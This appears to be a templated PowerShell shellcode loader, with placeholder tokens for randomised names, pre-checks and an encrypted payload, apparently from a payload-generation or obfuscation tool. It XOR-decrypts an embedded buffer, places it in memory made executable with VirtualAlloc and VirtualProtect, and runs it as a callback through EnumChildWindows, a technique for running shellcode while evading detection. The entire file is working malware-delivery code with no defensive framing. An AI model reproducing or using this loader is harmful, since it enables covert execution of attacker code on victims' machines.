{{PRE_CHECKS}}
{{V_KEY}} = [Convert]::FromBase64String("{{XOR_KEY_B64}}")
{{PAYLOAD_BLOCK}}

function {{FN_DECRYPT}}([byte[]]$data, [byte[]]$key) {
    $out = New-Object byte[] $data.Length
    for ($i=0; $i -lt $data.Length; $i++) {
        $out[$i] = $data[$i] -bxor $key[$i % $key.Length]
    }
    return $out
}

{{V_BUF}} = {{FN_DECRYPT}} {{V_ENC}} {{V_KEY}}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class {{V_CB}} {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    public delegate bool EnumWndProc(IntPtr hwnd, IntPtr lParam);

    [DllImport("user32.dll")]
    public static extern bool EnumChildWindows(IntPtr hWndParent, EnumWndProc lpEnumFunc, IntPtr lParam);

    public static void Run(byte[] sc) {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x04);
        Marshal.Copy(sc, 0, addr, sc.Length);
        uint old = 0;
        VirtualProtect(addr, (uint)sc.Length, 0x20, out old);
        EnumWndProc cb = (EnumWndProc)Marshal.GetDelegateForFunctionPointer(addr, typeof(EnumWndProc));
        EnumChildWindows(IntPtr.Zero, cb, IntPtr.Zero);
    }
}
"@

[{{V_CB}}]::Run({{V_BUF}})
